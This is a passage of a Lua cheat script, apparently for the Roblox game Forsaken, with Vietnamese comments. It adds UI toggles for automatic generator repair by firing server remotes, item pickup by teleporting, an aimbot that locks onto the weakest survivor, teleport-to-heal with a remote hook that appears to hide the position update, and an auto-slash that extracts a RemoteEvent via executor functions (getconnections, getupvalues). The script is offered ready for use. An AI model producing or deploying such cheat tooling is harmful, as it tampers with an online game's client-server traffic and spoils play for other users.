 775 |                 local gens = getUnfinishedGenerators()
 776 |                 for _, gen in ipairs(gens) do
 777 |                     if not _G.SurvivorsFarm then break end
 778 |                     fixOneGenerator(gen)
 779 |                     task.wait(genDelay) -- sau khi s·ª≠a xong th√¨ nh·∫£y qua gen kh√°c
 780 |                 end
 781 |             end
 782 |             task.wait(0.1)
 783 |         end
 784 |     end)
 785 | end)
 786 | 
 787 | 
 788 | 
 789 | 
 790 | 
 791 | 
 792 | 
 793 |     Tabs.Farm:AddSection("‚Ü≥Generator")
 794 | 
 795 | do
 796 | local solveGeneratorCooldown = false
 797 | local AutoFinishGen = false
 798 | local genDelay = 1.5 -- m·∫∑c ƒë·ªãnh 1.5s
 799 | 
 800 | -- H√†m t√¨m generator g·∫ßn nh·∫•t
 801 | local function getClosestGenerator()
 802 |     local char = game.Players.LocalPlayer.Character
 803 |     if not char or not char.PrimaryPart then return nil end
 804 | 
 805 |     local root = char.PrimaryPart
 806 |     local closest, shortestDist = nil, math.huge
 807 | 
 808 |     local mapContainer = workspace:FindFirstChild("Map")
 809 |     if mapContainer then
 810 |         local ingame = mapContainer:FindFirstChild("Ingame")
 811 |         if ingame then
 812 |             local map = ingame:FindFirstChild("Map")
 813 |             if map then
 814 |                 for _, obj in ipairs(map:GetChildren()) do
 815 |                     if obj.Name == "Generator" and obj:IsA("Model") and obj.PrimaryPart then
 816 |                         local dist = (root.Position - obj.PrimaryPart.Position).Magnitude
 817 |                         if dist < shortestDist then
 818 |                             closest = obj
 819 |                             shortestDist = dist
 820 |                         end
 821 |                     end
 822 |                 end
 823 |             end
 824 |         end
 825 |     end
 826 |     return closest
 827 | end
 828 | 
 829 | -- N√∫t Finish generator th·ªß c√¥ng
 830 | Tabs.Farm:AddButton({
 831 |     Title = "Finish Generator",
 832 |     Callback = function()
 833 |         if solveGeneratorCooldown then 
 834 |             print("‚è≥ Please wait before trying again!") 
 835 |             return
 836 |         end
 837 |         if AutoFinishGen then
 838 |             print("‚ùå Please disable Auto Finish Generator first!")
 839 |             return
 840 |         end
 841 | 
 842 |         local gen = getClosestGenerator()
 843 |         if gen and gen:FindFirstChild("Remotes") and gen.Remotes:FindFirstChild("RE") then
 844 |             gen.Remotes.RE:FireServer()
 845 |             solveGeneratorCooldown = true
 846 |             task.delay(genDelay, function()
 847 |                 solveGeneratorCooldown = false
 848 |             end)
 849 |         end
 850 |     end
 851 | })
 852 | 
 853 | -- Toggle Auto Finish Generator
 854 | Tabs.Farm:AddToggle("AutoFinishGen", {
 855 |     Title = "Auto Finish Generator",
 856 |     Default = false
 857 | }):OnChanged(function(state)
 858 |     AutoFinishGen = state
 859 | 
 860 |     if state then
 861 |         if solveGeneratorCooldown then
 862 |             print("‚ö†Ô∏è Please wait cooldown before enabling Auto Finish!") 
 863 |             Fluent.Options.AutoFinishGen:SetValue(false)
 864 |             return
 865 |         end
 866 | 
 867 |         task.spawn(function()
 868 |             while AutoFinishGen do
 869 |                 local gen = getClosestGenerator()
 870 |                 if gen and gen:FindFirstChild("Remotes") and gen.Remotes:FindFirstChild("RE") then
 871 |                     gen.Remotes.RE:FireServer()
 872 |                 end
 873 |                 solveGeneratorCooldown = true
 874 |                 task.wait(genDelay)
 875 |                 solveGeneratorCooldown = false
 876 |             end
 877 |         end)
 878 |     else
 879 |         solveGeneratorCooldown = false
 880 |     end
 881 | end)
 882 | 
 883 | 
 884 | -- √î nh·∫≠p delay
 885 | Tabs.Farm:AddInput("GenDelayInput", {
 886 |     Title = "Enter Delay",
 887 |     Default = "1.5",
 888 |     Placeholder = "Write Here (1.5-10)",
 889 |     Numeric = true,
 890 |     Callback = function(value)
 891 |         local num = tonumber(value)
 892 |         if num then
 893 |             -- Clamp gi√° tr·ªã t·ª´ 1.5 ƒë·∫øn 10
 894 |             genDelay = math.clamp(num, 1.5, 10)
 895 |             print("‚è± Delay set to:", genDelay)
 896 |         else
 897 |             print("‚ö†Ô∏è Nh·∫≠p s·ªë h·ª£p l·ªá!")
 898 |         end
 899 |     end
 900 | })
 901 | end
 902 | 
 903 | 
 904 | do
 905 | local Players = game:GetService("Players")
 906 | local PathfindingService = game:GetService("PathfindingService")
 907 | local ReplicatedStorage = game:GetService("ReplicatedStorage")
 908 | local Workspace = game:GetService("Workspace")
 909 | local UserInputService = game:GetService("UserInputService")
 910 | local RunService = game:GetService("RunService")
 911 | local LP = Players.LocalPlayer
 912 | 
 913 | -- üîπ Cancel token cho pathfinding
 914 | local h = 0
 915 | _G.PlayerControlled = false
 916 | 
 917 | -- =========================
 918 | --  DANH S√ÅCH SURVIVORS H·ª¢P L·ªÜ
 919 | -- =========================
 920 | local AllowedSurvivors = {
 921 |     ["Noob"] = true, ["Guest1337"] = true, ["Elliot"] = true,
 922 |     ["Shedletsky"] = true, ["TwoTime"] = true, ["007n7"] = true, ["Veeronica"] = true,
 923 |     ["Chance"] = true, ["Builderman"] = true, ["Taph"] = true, ["Dusekkar"] = true,
 924 | }
 925 | 
 926 | local function isSurvivorValid()
 927 |     local char = LP.Character
 928 |     if not char then return false end
 929 |     return AllowedSurvivors[char.Name] == true
 930 | end
 931 | 
 932 | -- =========================
 933 | --  PH√ÅT HI·ªÜN NG∆Ø·ªúI CH∆†I ƒêI·ªÄU KHI·ªÇN
 934 | -- =========================
 935 | local moveKeys = {
 936 |     [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
 937 |     [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
 938 | }
 939 | local activeInputs, lastMoveTick = 0, 0
 940 | local IDLE_GRACE = 0.25
 941 | 
 942 | local function setControlled(flag)
 943 |     if _G.PlayerControlled ~= flag then
 944 |         _G.PlayerControlled = flag
 945 |         if flag then h = h + 1 end -- h·ªßy path ngay khi ng∆∞·ªùi ch∆°i can thi·ªáp
 946 |     end
 947 | end
 948 | 
 949 | UserInputService.InputBegan:Connect(function(input, gp)
 950 |     if gp then return end
 951 |     if input.UserInputType == Enum.UserInputType.Keyboard and moveKeys[input.KeyCode] then
 952 |         activeInputs += 1; setControlled(true)
 953 |     elseif input.UserInputType == Enum.UserInputType.Gamepad1 then
 954 |         activeInputs += 1; setControlled(true)
 955 |     elseif input.UserInputType == Enum.UserInputType.Touch then
 956 |         local cam = workspace.CurrentCamera
 957 |         if cam and input.Position.X < cam.ViewportSize.X * 0.5 then
 958 |             activeInputs += 1; setControlled(true)
 959 |         end
 960 |     end
 961 | end)
 962 | 
 963 | UserInputService.InputEnded:Connect(function(input)
 964 |     if input.UserInputType == Enum.UserInputType.Keyboard and moveKeys[input.KeyCode] then
 965 |         activeInputs = math.max(0, activeInputs - 1)
 966 |     elseif input.UserInputType == Enum.UserInputType.Gamepad1 or input.UserInputType == Enum.UserInputType.Touch then
 967 |         activeInputs = math.max(0, activeInputs - 1)
 968 |     end
 969 |     if activeInputs == 0 then lastMoveTick = tick() end
 970 | end)
 971 | 
 972 | RunService.Heartbeat:Connect(function()
 973 |     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
 974 |     if not hum then return end
 975 |     if hum.MoveDirection.Magnitude > 0 then
 976 |         lastMoveTick = tick(); setControlled(true)
 977 |     elseif activeInputs == 0 and (tick() - lastMoveTick) >= IDLE_GRACE then
 978 |         setControlled(false)
 979 |     end
 980 | end)
 981 | 
 982 | -- =========================
 983 | --  PATHFINDING
 984 | -- =========================
 985 | local function pathfindTo(targetPos)
 986 |     local hNow = h
 987 |     local char = LP.Character
 988 |     if not char then return end
 989 |     local hum = char:FindFirstChildOfClass("Humanoid")
 990 |     local root = char:FindFirstChild("HumanoidRootPart")
 991 |     if not (hum and root) then return end
 992 | 
 993 |     local path = PathfindingService:CreatePath({
 994 |         AgentRadius = 2, AgentHeight = 5,
 995 |         AgentCanJump = false, AgentJumpHeight = 10, AgentMaxSlope = 45
 996 |     })
 997 | 
 998 |     local ok = pcall(function() path:ComputeAsync(root.Position, targetPos) end)
 999 |     if not ok or path.Status ~= Enum.PathStatus.Success then return end
1000 | 
1001 |     for _, wp in ipairs(path:GetWaypoints()) do
1002 |         if hNow ~= h or _G.PlayerControlled then return end
1003 |         if not (hum and root and root.Parent) then return end
1004 | 
1005 |         hum:MoveTo(wp.Position)
1006 |         repeat task.wait()
1007 |         until hNow ~= h or _G.PlayerControlled or not root.Parent
1008 |            or ((root.Position * Vector3.new(1,0,1) - wp.Position * Vector3.new(1,0,1)).Magnitude <= 2)
1009 | 
1010 |         if wp.Action == Enum.PathWaypointAction.Jump then hum.Jump = true end
1011 |     end
1012 | end
1013 | 
1014 | -- =========================
1015 | --  H·ªñ TR·ª¢ KI·ªÇM TRA KILLER
1016 | -- =========================
1017 | local function isKillerNearGenerator(generatorPos, distance)
1018 |     local killersFolder = Workspace.Players:FindFirstChild("Killers")
1019 |     if not killersFolder then return false end
1020 |     for _, killer in ipairs(killersFolder:GetChildren()) do
1021 |         local hrp = killer:FindFirstChild("HumanoidRootPart")
1022 |         if hrp and (hrp.Position - generatorPos).Magnitude <= distance then
1023 |             return true
1024 |         end
1025 |     end
1026 |     return false
1027 | end
1028 | 
1029 | -- =========================
1030 | --  TOGGLE AUTO WALK & FIX GENERATORS
1031 | -- =========================
1032 | local GenWalkToggle = Tabs.Farm:AddToggle("GenWalkToggle", {
1033 |     Title = "Walk To Generator",
1034 |     Default = false
1035 | })
1036 | 
1037 | GenWalkToggle:OnChanged(function(Value)
1038 |     _G.AutoGenerators = Value
1039 |     if not Value then h = h + 1 end
1040 | 
1041 |     -- Auto Sprint (c√≥ ki·ªÉm so√°t stamina)
1042 |     if Value then
1043 |         _G.alwaysSprint = true
1044 |         task.spawn(function()
1045 |             local okSprint, sprint = pcall(function() return require(ReplicatedStorage.Systems.Character.Game.Sprinting) end)
1046 |             local okStam, stamina = pcall(function() return require(ReplicatedStorage.Systems.Character.Game.StaminaHandler) end)
1047 |             if not okSprint then return end
1048 | 
1049 |             local LOW, HIGH, lastReset, forceStop = 10, 80, tick(), false
1050 |             local function fireSprint(flag)
1051 |                 sprint.IsSprinting = flag
1052 |                 pcall(function() if sprint.__sprintedEvent then sprint.__sprintedEvent:Fire(flag) end end)
1053 |             end
1054 | 
1055 |             while _G.alwaysSprint and _G.AutoGenerators and task.wait() do
1056 |                 -- üîí Ch·ªâ ch·∫°y khi l√† survivor h·ª£p l·ªá; n·∫øu kh√¥ng th√¨ t·∫Øt sprint v√† ch·ªù
1057 |                 if not isSurvivorValid() then
1058 |                     if okSprint and sprint.IsSprinting then fireSprint(false) end
1059 |                     continue
1060 |                 end
1061 | 
1062 |                 if okStam and type(stamina.Value) == "number" then
1063 |                     if stamina.Value <= LOW then if sprint.IsSprinting then fireSprint(false) end; forceStop = true end
1064 |                     if forceStop and stamina.Value >= HIGH then fireSprint(true); forceStop = false; lastReset = tick() end
1065 |                 end
1066 |                 if not forceStop and not sprint.IsSprinting then fireSprint(true); lastReset = tick() end
1067 |                 if not forceStop and tick() - lastReset >= 3 then
1068 |                     fireSprint(false); task.wait(0.1); fireSprint(true); lastReset = tick()
1069 |                 end
1070 |             end
1071 |         end)
1072 |     else
1073 |         _G.alwaysSprint = false
1074 |     end
1075 | 
1076 |     -- Auto Generators loop
1077 |     task.spawn(function()
1078 |         while true do
1079 |             if not _G.AutoGenerators then task.wait(1); continue end
1080 |             if not isSurvivorValid() then task.wait(1); continue end -- ‚úÖ ch·ªâ cho ph√©p survivors h·ª£p l·ªá
1081 | 
1082 |             if _G.PlayerControlled then task.wait(0.1); continue end
1083 | 
1084 |             local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
1085 |             if not hrp then task.wait(1); continue end
1086 | 
1087 |             local map = Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("Ingame") and Workspace.Map.Ingame:FindFirstChild("Map")
1088 |             if not map then task.wait(2); continue end
1089 | 
1090 |             local gens = {}
1091 |             for _, gen in ipairs(map:GetChildren()) do
1092 |                 if gen.Name == "Generator" and gen:FindFirstChild("Progress") and gen.Progress.Value < 100 then
1093 |                     table.insert(gens, gen)
1094 |                 end
1095 |             end
1096 |             if #gens == 0 then task.wait(3); continue end
1097 | 
1098 |             table.sort(gens, function(a, b)
1099 |                 local ca, cb = a.Positions and a.Positions:FindFirstChild("Center"), b.Positions and b.Positions:FindFirstChild("Center") -- ‚úÖ s·ª≠a 'v√†' -> 'and'
1100 |                 if ca and cb then
1101 |                     return (hrp.Position - ca.Position).Magnitude < (hrp.Position - cb.Position).Magnitude
1102 |                 end
1103 |                 return false
1104 |             end)
1105 | 
1106 |             local targetGen = gens[1]
1107 |             if targetGen and targetGen.Positions and targetGen.Positions:FindFirstChild("Center") then
1108 |                 local center = targetGen.Positions.Center.Position
1109 |                 if isKillerNearGenerator(center, 50) then task.wait(2); continue end
1110 | 
1111 |                 if not _G.PlayerControlled then pcall(function() pathfindTo(center) end) end
1112 |                 repeat task.wait(0.05)
1113 |                 until not _G.AutoGenerators or _G.PlayerControlled or not hrp.Parent or (hrp.Position - center).Magnitude <= 6
1114 |                 if _G.PlayerControlled then continue end
1115 | 
1116 |                 local prompt = targetGen.Main and targetGen.Main:FindFirstChild("Prompt")
1117 |                 if prompt and (hrp.Position - center).Magnitude <= 6 then
1118 |                     prompt.HoldDuration, prompt.RequiresLineOfSight, prompt.MaxActivationDistance = 0, false, 99999
1119 |                     while _G.AutoGenerators and not _G.PlayerControlled and targetGen.Parent and targetGen:FindFirstChild("Progress") and targetGen.Progress.Value < 100 do
1120 |                         if (hrp.Position - center).Magnitude > 6 then break end
1121 |                         -- üîπ Nh·∫•n 1 l·∫ßn r·ªìi ch·ªù 3 gi√¢y
1122 |                         pcall(function()
1123 |                             prompt:InputHoldBegin()
1124 |                         end)
1125 |                         task.wait(0.2) -- gi·ªØ nh·∫π ƒë·ªÉ ch·∫Øc ch·∫Øn ƒÉn l·ªánh
1126 |                         pcall(function()
1127 |                             prompt:InputHoldEnd()
1128 |                         end)
1129 |                         task.wait(3.0) -- ngh·ªâ 3 gi√¢y
1130 |                     end
1131 |                 end
1132 |             end
1133 |             task.wait(0.5)
1134 |         end
1135 |     end)
1136 | end)
1137 | 
1138 | -- Reset path khi map m·ªõi spawn
1139 | Workspace.ChildAdded:Connect(function(child)
1140 |     if child.Name == "Map" then h = h + 1 end
1141 | end)
1142 | end
1143 | 
1144 | 
1145 | 
1146 |     Tabs.Farm:AddSection("Items")
1147 | 
1148 | local Players = game:GetService("Players")
1149 | local LP = Players.LocalPlayer
1150 | 
1151 | -- H√†m nh·∫∑t item g·∫ßn nh·∫•t
1152 | local function pickUpNearest()
1153 |     local map = workspace:FindFirstChild("Map") 
1154 |                 and workspace.Map:FindFirstChild("Ingame") 
1155 |                 and workspace.Map.Ingame:FindFirstChild("Map")
1156 |     if not map or not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then return end
1157 | 
1158 |     local oldCFrame = LP.Character.HumanoidRootPart.CFrame
1159 |     for _, item in ipairs(map:GetChildren()) do
1160 |         if item:IsA("Tool") and item:FindFirstChild("ItemRoot") 
1161 |            and item.ItemRoot:FindFirstChild("ProximityPrompt") then
1162 |             LP.Character.HumanoidRootPart.CFrame = item.ItemRoot.CFrame
1163 |             task.wait(0.3)
1164 |             fireproximityprompt(item.ItemRoot.ProximityPrompt)
1165 |             task.wait(0.4)
1166 |             LP.Character.HumanoidRootPart.CFrame = oldCFrame
1167 |             break
1168 |         end
1169 |     end
1170 | end
1171 | 
1172 | -- Button: Pick Up Item (1 l·∫ßn)
1173 | Tabs.Farm:AddButton({
1174 |     Title = "Pick Up Item",
1175 |     Callback = pickUpNearest
1176 | })
1177 | 
1178 | -- Toggle: Auto PickUp Item (l·∫∑p)
1179 | Tabs.Farm:AddToggle("ItemPick", {
1180 |     Title = "Auto PickUp Item",
1181 |     Default = false
1182 | }):OnChanged(function(Value)
1183 |     _G.PickupItem = Value
1184 |     if not Value then return end
1185 | 
1186 |     task.spawn(function()
1187 |         while _G.PickupItem do
1188 |             pickUpNearest()
1189 |             task.wait(0.2) -- delay gi·ªØa m·ªói l·∫ßn nh·∫∑t
1190 |         end
1191 |     end)
1192 | end)
1193 | 
1194 | 
1195 | 
1196 | 
1197 | -- Tabs.Main
1198 | 
1199 | Tabs.Main:AddParagraph({
1200 |     Title = "How to Use Script :",
1201 |     Content = "1: Must adjust the slider to increase or decrease\n2: Must not be min or max because it will not work\n3: Then turn on the buttons to use those functions\n\n|| Like, Share And Subscribe For SLK gaming ||"
1202 | })
1203 | 
1204 | 
1205 | 
1206 |     Tabs.Main:AddSection("‚Ü≥Eliot")
1207 | 
1208 | do
1209 | -- üß© GUI Toggle + Input
1210 | local toggleOn = false
1211 | local toggleFlag = Instance.new("BoolValue")
1212 | toggleFlag.Name = "EliotPizzaAim_ToggleFlag"
1213 | toggleFlag.Value = false
1214 | 
1215 | Tabs.Main:AddToggle("NemPizza", {
1216 |     Title = "Pizza Aimbot",
1217 |     Default = toggleOn,
1218 | }):OnChanged(function(state)
1219 |     toggleOn = state
1220 |     toggleFlag.Value = state
1221 | end)
1222 | 
1223 | -- kho·∫£ng c√°ch aim (studs)
1224 | local maxDistance = 100
1225 | Tabs.Main:AddInput("PizzaAimDistance", {
1226 |     Title = "Aim Distance",
1227 |     Default = tostring(maxDistance),
1228 |     Placeholder = "Enter Number",
1229 | }):OnChanged(function(value)
1230 |     local num = tonumber(value)
1231 |     if num then
1232 |         maxDistance = num
1233 |     end
1234 | end)
1235 | 
1236 | -- ‚öôÔ∏è Services
1237 | local Players = game:GetService("Players")
1238 | local RunService = game:GetService("RunService")
1239 | local localPlayer = Players.LocalPlayer
1240 | local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
1241 | 
1242 | -- üéûÔ∏è Animation IDs
1243 | local PizzaAnimation = {
1244 |     ["114155003741146"] = true,
1245 |     ["104033348426533"] = true
1246 | }
1247 | 
1248 | -- üß† Eliot check
1249 | local EliotModels = {["Elliot"] = true}
1250 | 
1251 | -- üîñ State
1252 | local autoRotateDisabledByScript = false
1253 | local currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
1254 | local aimOffset = 2 -- l·ªách ph·∫£i 2 studs
1255 | 
1256 | -- ‚öôÔ∏è Utils
1257 | local function isEliot()
1258 |     local char = localPlayer.Character
1259 |     return char and EliotModels[char.Name] or false
1260 | end
1261 | 
1262 | local function getMyHumanoid()
1263 |     local char = localPlayer.Character
1264 |     return char and char:FindFirstChildWhichIsA("Humanoid")
1265 | end
1266 | 
1267 | local function restoreAutoRotate()
1268 |     local hum = getMyHumanoid()
1269 |     if hum and autoRotateDisabledByScript then
1270 |         hum.AutoRotate = true
1271 |         autoRotateDisabledByScript = false
1272 |     end
1273 | end
1274 | 
1275 | local function isPlayingDangerousAnimation()
1276 |     local humanoid = getMyHumanoid()
1277 |     if not humanoid then return false end
1278 |     local animator = humanoid:FindFirstChildOfClass("Animator")
1279 |     if not animator then return false end
1280 |     for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
1281 |         if track and track.Animation and track.Animation.AnimationId then
1282 |             local animId = tostring(track.Animation.AnimationId):match("%d+")
1283 |             if animId and PizzaAnimation[animId] then
1284 |                 return true
1285 |             end
1286 |         end
1287 |     end
1288 |     return false
1289 | end
1290 | 
1291 | -- üéØ L·∫•y survivor y·∫øu m√°u nh·∫•t (trong folder Survivors)
1292 | local function getWeakestSurvivor()
1293 |     local list = {}
1294 |     local myChar = localPlayer.Character
1295 |     local myHum = getMyHumanoid()
1296 |     local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
1297 |     if not myRoot or not myHum or not myHum.MaxHealth or myHum.MaxHealth <= 0 then return nil end
1298 | 
1299 |     local myHpPercent = myHum.Health / myHum.MaxHealth
1300 | 
1301 |     for _, obj in ipairs(survivorsFolder:GetChildren()) do
1302 |         if obj:IsA("Model") and obj ~= myChar then
1303 |             local hum = obj:FindFirstChildWhichIsA("Humanoid")
1304 |             local hrp = obj:FindFirstChild("HumanoidRootPart")
1305 |             if hum and hrp and hum.Health > 0 and hum.MaxHealth > 0 then
1306 |                 local dist = (hrp.Position - myRoot.Position).Magnitude
1307 |                 local hpPercent = hum.Health / hum.MaxHealth
1308 |                 if dist <= maxDistance then
1309 |                     table.insert(list, {model = obj, hp = hpPercent})
1310 |                 end
1311 |             end
1312 |         end
1313 |     end
1314 | 
1315 |     -- S·∫Øp x·∫øp theo % m√°u tƒÉng d·∫ßn
1316 |     table.sort(list, function(a, b)
1317 |         return a.hp < b.hp
1318 |     end)
1319 | 
1320 |     if #list == 0 then return nil end
1321 |     if myHpPercent <= list[1].hp and #list > 1 then
1322 |         return list[2].model
1323 |     else
1324 |         return list[1].model
1325 |     end
1326 | end
1327 | 
1328 | -- üîÅ Reset khi respawn
1329 | localPlayer.CharacterAdded:Connect(function()
1330 |     task.delay(0.1, function()
1331 |         autoRotateDisabledByScript = false
1332 |     end)
1333 | end)
1334 | 
1335 | -- üîÇ Main loop
1336 | RunService.RenderStepped:Connect(function()
1337 |     if not toggleFlag.Value then
1338 |         restoreAutoRotate()
1339 |         currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
1340 |         return
1341 |     end
1342 | 
1343 |     if not isEliot() then
1344 |         restoreAutoRotate()
1345 |         currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
1346 |         return
1347 |     end
1348 | 
1349 |     local myHumanoid = getMyHumanoid()
1350 |     if not myHumanoid then return end
1351 |     local myRoot = myHumanoid.Parent and myHumanoid.Parent:FindFirstChild("HumanoidRootPart")
1352 |     if not myRoot then return end
1353 | 
1354 |     local isPlaying = isPlayingDangerousAnimation()
1355 | 
1356 |     -- üß≤ Lock target khi b·∫Øt ƒë·∫ßu animation
1357 |     if isPlaying and not isLockedOn then
1358 |         currentTarget = getWeakestSurvivor()
1359 |         if currentTarget then isLockedOn = true end
1360 |     end
1361 | 
1362 |     -- ‚öôÔ∏è Validate target
1363 |     if isLockedOn and currentTarget then
1364 |         local tHum = currentTarget:FindFirstChildWhichIsA("Humanoid")
1365 |         local tHrp = currentTarget:FindFirstChild("HumanoidRootPart")
1366 |         if (not tHum) or (tHum.Health <= 0) or (not tHrp) then
1367 |             currentTarget, isLockedOn = nil, false
1368 |         end
1369 |     end
1370 | 
1371 |     -- ‚èπÔ∏è End animation -> reset
1372 |     if (not isPlaying) and wasPlayingAnimation then
1373 |         currentTarget, isLockedOn = nil, false
1374 |         restoreAutoRotate()
1375 |     end
1376 |     wasPlayingAnimation = isPlaying
1377 | 
1378 |     -- üéØ Aim logic
1379 |     if isPlaying and isLockedOn and currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
1380 |         local hrp = currentTarget.HumanoidRootPart
1381 |         local targetPos = hrp.Position
1382 |         if not autoRotateDisabledByScript then
1383 |             myHumanoid.AutoRotate = false
1384 |             autoRotateDisabledByScript = true
1385 |         end
1386 | 
1387 |         -- d·ª± ƒëo√°n h∆∞·ªõng di chuy·ªÉn nh·∫π
1388 |         local vel = hrp.Velocity
1389 |         if vel and vel.Magnitude > 2 then
1390 |             targetPos = targetPos + hrp.CFrame.LookVector * 3
1391 |         end
1392 | 
1393 |         -- l·ªách ph·∫£i
1394 |         local offset = myRoot.CFrame.RightVector * aimOffset
1395 |         local lookAt = Vector3.new(targetPos.X, myRoot.Position.Y, targetPos.Z) + offset
1396 | 
1397 |         myRoot.CFrame = myRoot.CFrame:Lerp(CFrame.lookAt(myRoot.Position, lookAt), 0.99)
1398 |     end
1399 | end)
1400 | end
1401 | 
1402 | 
1403 | 
1404 | --// üçï Auto Eat Pizza Instantly (Fluent Toggle Style)
1405 | --// ======================================
1406 | 
1407 | do
1408 |     -- üåç Global Vars
1409 |     local Players = game:GetService("Players")
1410 |     local Workspace = game:GetService("Workspace")
1411 |     local LocalPlayer = Players.LocalPlayer
1412 | 
1413 |     getgenv().BlinkToPizzaToggle = false
1414 |     getgenv().HPThreshold = 30
1415 | 
1416 |     -- üß© Helper Functions
1417 |     local function getHRP()
1418 |         local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
1419 |         return char:WaitForChild("HumanoidRootPart")
1420 |     end
1421 | 
1422 |     local function getHP()
1423 |         local char = LocalPlayer.Character
1424 |         if char then
1425 |             local hum = char:FindFirstChildOfClass("Humanoid")
1426 |             if hum then return hum.Health end
1427 |         end
1428 |         return 0
1429 |     end
1430 | 
1431 |     local function getPizzaCF()
1432 |         local map = Workspace:FindFirstChild("Map")
1433 |         local ingame = map and map:FindFirstChild("Ingame")
1434 |         if not ingame then return nil end
1435 | 
1436 |         local pizza = ingame:FindFirstChild("Pizza")
1437 |         if not pizza then return nil end
1438 | 
1439 |         if pizza:IsA("BasePart") or pizza:IsA("MeshPart") or pizza:IsA("UnionOperation") then
1440 |             return pizza.CFrame
1441 |         elseif pizza:IsA("Model") then
1442 |             local pp = pizza.PrimaryPart or pizza:FindFirstChildWhichIsA("BasePart")
1443 |             if pp then
1444 |                 if not pizza.PrimaryPart then pizza.PrimaryPart = pp end
1445 |                 return pp.CFrame
1446 |             end
1447 |         elseif pizza:IsA("CFrameValue") then
1448 |             return pizza.Value
1449 |         end
1450 |     end
1451 | 
1452 |     -- ?? Fluent UI Section
1453 | 
1454 |     -- üçï Toggle t·ª± ƒÉn pizza
1455 |     Tabs.Main:AddToggle("BlinkPizza_Toggle", {
1456 |         Title = "Auto Eat Pizza",
1457 |         Default = false,
1458 |     }):OnChanged(function(state)
1459 |         getgenv().BlinkToPizzaToggle = state
1460 |     end)
1461 | 
1462 |     -- ‚ù§Ô∏è Input HP Threshold
1463 |     Tabs.Main:AddInput("PizzaHPThreshold", {
1464 |         Title = "HP Threshold",
1465 |         Default = tostring(getgenv().HPThreshold),
1466 |         Placeholder = "30",
1467 |     }):OnChanged(function(value)
1468 |         local num = tonumber(value)
1469 |         if num then
1470 |             getgenv().HPThreshold = num
1471 |         end
1472 |     end)
1473 | 
1474 |     -- üîÅ Auto Loop
1475 |     task.spawn(function()
1476 |         while task.wait(0.9) do
1477 |             if getgenv().BlinkToPizzaToggle then
1478 |                 local hrp = getHRP()
1479 |                 local pizzaCF = getPizzaCF()
1480 |                 if pizzaCF and getHP() <= getgenv().HPThreshold then
1481 |                     local oldCF = hrp.CFrame
1482 |                     hrp.CFrame = pizzaCF * CFrame.new(0, 1, 0)
1483 | 
1484 |                     if getgenv().activateRemoteHook then
1485 |                         getgenv().activateRemoteHook("UnreliableRemoteEvent", "UpdCF")
1486 |                     end
1487 | 
1488 |                     task.delay(0.2, function()
1489 |                         hrp.CFrame = oldCF
1490 |                         task.wait(0.3)
1491 |                         if getgenv().deactivateRemoteHook then
1492 |                             getgenv().deactivateRemoteHook("UnreliableRemoteEvent", "UpdCF")
1493 |                         end
1494 |                     end)
1495 |                 end
1496 |             end
1497 |         end
1498 |     end)
1499 | end
1500 | 
1501 | 
1502 |     Tabs.Main:AddSection("Shedletsky")
1503 | 
1504 | 
1505 | do
1506 |     local Players = game:GetService("Players")
1507 |     local RunService = game:GetService("RunService")
1508 |     local lp = Players.LocalPlayer
1509 | 
1510 |     -- ‚öôÔ∏è Variables
1511 |     local enabled = false
1512 |     local mode = "AI Aimbot"
1513 |     local cooldown = false
1514 |     local lastTarget = nil
1515 |     local maxDistance = 5
1516 |     local sliderInitialized = false
1517 | 
1518 |     local TELEPORT_DURATION = 0.8
1519 |     local AI_DELAY = 15 -- ‚è≥ Delay gi·ªØa m·ªói l·∫ßn teleport AI
1520 | 
1521 |     local killersFolder = workspace:WaitForChild("Players"):WaitForChild("Killers")
1522 | 
1523 |     -- üéµ Animation IDs
1524 |     local monitoredAnimations = {
1525 |         'rbxassetid://116618003477002', 'rbxassetid://121255898612475',
1526 |         'rbxassetid://98031287364865',  'rbxassetid://119462383658044',
1527 |         'rbxassetid://77448521277146',  'rbxassetid://103741352379819',
1528 |         'rbxassetid://131696603025265', 'rbxassetid://122503338277352',
1529 |         'rbxassetid://97648548303678'
1530 |     }
1531 | 
1532 |     -- üîß Slash button + remote
1533 |     local slashButton, slashRemote, slashConnections = nil, nil, {}
1534 | 
1535 |     local function findSlashRemote()
1536 |         if slashRemote then return slashRemote end
1537 |         if not slashButton then return nil end
1538 |         for _, conn in ipairs(getconnections(slashButton.MouseButton1Click)) do
1539 |             local f = conn.Function
1540 |             if f and islclosure(f) then
1541 |                 for _, v in pairs(getupvalues(f)) do
1542 |                     if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
1543 |                         slashRemote = v
1544 |                         warn("[AutoSlash] Found Slash Remote:", v:GetFullName())
1545 |                         return slashRemote
1546 |                     end
1547 |                 end
1548 |             end
1549 |         end
1550 |         return nil
1551 |     end
1552 | 
1553 |     local function initSlashButton()
1554 |         local gui = lp:FindFirstChild("PlayerGui")
1555 |         if not gui then return end
1556 |         local mainUI = gui:FindFirstChild("MainUI")
1557 |         local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
1558 |         slashButton = container and container:FindFirstChild("Slash")
1559 |         if slashButton and slashButton:IsA("ImageButton") then
1560 |             slashConnections = getconnections(slashButton.MouseButton1Click)
1561 |             findSlashRemote()
1562 |         end
1563 |     end
1564 | 
1565 |     initSlashButton()
1566 |     lp.CharacterAdded:Connect(function()
1567 |         task.wait(0.5)
1568 |         initSlashButton()
1569 |     end)
1570 | 
1571 |     local function useSlash()
1572 |         if slashRemote then
1573 |             pcall(function()
1574 |                 slashRemote:FireServer(true)
1575 |                 task.delay(0.05, function()
1576 |                     slashRemote:FireServer(false)
1577 |                 end)
1578 |             end)
1579 |         elseif slashButton then
